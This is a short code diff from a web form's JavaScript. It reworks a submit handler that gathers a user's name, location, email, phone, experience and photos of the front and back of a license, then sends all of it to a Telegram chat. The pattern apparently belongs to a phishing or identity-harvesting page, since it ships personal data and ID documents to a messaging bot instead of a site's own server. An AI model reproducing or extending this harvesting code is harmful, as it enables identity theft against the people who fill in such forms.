@@ -208,12 +208,17 @@
         return;
       }
 
-const name       = localStorage.getItem('name') || 'N/A';
-const location   = localStorage.getItem('location') || 'N/A';
-const email      = localStorage.getItem('email') || 'N/A';
-const phone      = localStorage.getItem('phone') || 'N/A';
-const experience = localStorage.getItem('experience') || 'N/A';
-const messageText = 
+      submitBtn.textContent = 'Please wait...';
+      submitBtn.style.backgroundColor = '#28a745';
+      submitBtn.disabled = true;
+
+      try {
+        const name       = localStorage.getItem('name') || 'N/A';
+        const location   = localStorage.getItem('location') || 'N/A';
+        const email      = localStorage.getItem('email') || 'N/A';
+        const phone      = localStorage.getItem('phone') || 'N/A';
+        const experience = localStorage.getItem('experience') || 'N/A';
+        const messageText = 
 `🧾 User Info:
 👤 Name:       ${name}
 🌏 Location:   ${location}
@@ -222,12 +227,7 @@ const messageText =
 😔 Experience: ${experience}
 🪪 Front License: ${licenseFront.name}
 🪪 Back License:  ${licenseBack.name}`;
-
-      submitBtn.textContent = 'Please wait...';
-      submitBtn.style.backgroundColor = '#28a745';
-      submitBtn.disabled = true;
-
-      try {
+        await sendTelegramMessage(messageText);
         await sendDocumentToTelegram(licenseFront, 'licenseFront');
         await sendDocumentToTelegram(licenseBack,       'licenseBack');
         alert('Documents submitted successfully!');
